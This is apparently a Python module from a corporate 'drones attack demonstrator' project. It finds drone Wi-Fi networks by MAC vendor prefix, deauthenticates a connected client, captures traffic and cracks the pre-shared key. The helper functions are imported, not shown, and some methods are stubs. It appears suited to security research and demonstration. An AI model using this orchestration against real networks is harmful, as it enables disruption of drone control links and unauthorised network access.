#!/usr/bin/env python3
# -*- coding: utf-8 -*-

##############################################################################
# Owner     : Expleo Group
# Author    : Tarek AZAIZ
# Project   : Drones Attack Demonstrator
# Subject   : Deauthenticate a legitime user frome the target drone network
# Version   : 0.1
# Created   : 2022/03/31
# Modified  : 2022/05/04
##############################################################################

from . wifi_nw_tools import *
import pandas
from ..config import *
from .wifi_vendors import *

class WifiAttacker():

    def __init__(self) -> None:
        pass


    def detect_drones(self) -> None:
        pass

    def get_target_networks():
        """
        import the CSV file list of all availables networks and search
        inside for potential drones according to their mac adresses (OUI).
        return : 'targets' : a list of targets.
        Each target of this list is a list like this :
        ['vendor', 'essid', 'bssid', 'chan']
        """
        # import and sort the CSV dumping input file
        df = pandas.read_csv(CSV_NW_DUMP, usecols=[' Power', ' ESSID', 'BSSID', ' channel'])
        df.sort_values([" Power"], axis=0, ascending=[False], inplace=True)

        targets = []
        for idx, row in df.iterrows():
            chan    = str(row[' channel']).strip()
            bssid   = row['BSSID']
            essid   = str(row[' ESSID']).strip()
            oui     = bssid[0:8]
            vendor = get_vendor(oui)

            if (vendor != "") :
                targets.append([vendor, essid, bssid, chan])

        return targets




    def dump_target_network(chan, bssid, interface=MNG_INTERF, duration=CLI_DUMP_DURATION):
        """ perform a dump of a specific network """
        restore_interf(interface)
        start_mon(chan, interface)
        dump_specific_nw(bssid, chan, MON_INTERF, duration)
        restore_interf(interface)
        
    
    def list_wifi_nw(self, capture_output=False) -> None:

        # prepare the network interface
        restore_interf()

        # start monitoring networks
        start_mon()

        # dump wifi networks
        dump_all_nw(hide_output = capture_output)

        # restore the interface
        restore_interf()

        # import and sort the CSV dumping input file
        df = pandas.read_csv(CSV_NW_DUMP, usecols=[' Power', ' ESSID', 'BSSID', ' channel'])
        df.sort_values([" Power"], axis=0, ascending=[False], inplace=True)
        
        # print the result
        #print("\n",df,"\n")

    def crack_key(self) -> None:
        pass


    def deauth_client(ap_bssid, cli_bssid, chan, essid
        , mng_interf=MNG_INTERF, mon_interf=MON_INTERF):
        restore_interf(mng_interf)
        start_mon(chan, mng_interf)
        deauth(ap_bssid, cli_bssid, essid, mon_interf)
        restore_interf(mng_interf)

    
    def crack_wifi(ap_bssid, cli_bssid, chan, essid
        , mng_interf=MNG_INTERF, mon_interf=MON_INTERF
        , duration=CLI_DUMP_DURATION):

        # device preparing
        restore_interf(mng_interf)
        start_mon(chan, mng_interf)

        # dumping thread
        t1 = threading.Thread(target=dump_specific_nw
            , args=(ap_bssid, chan, mon_interf, duration)
        )
        
        # deauth thread
        t2 = threading.Thread(target=deauth
            , args=(ap_bssid, cli_bssid, essid, mon_interf)
        )
        
        print("Démarrage thread 1 (dump)")
        t1.start()

        print("Démarrage thread 2 (deauth)")
        t2.start()

        t2.join()
        print("Thread 2 (deauth) terminé")

        t1.join()
        print("Thread 1 (dump) terminé")
        
        # device state restoring
        restore_interf(mng_interf)

        # pre-shared key cracking
        crack(ap_bssid, essid)


    def connect():
        pass


def main():
    pass


if __name__ == "__main__":
    main()
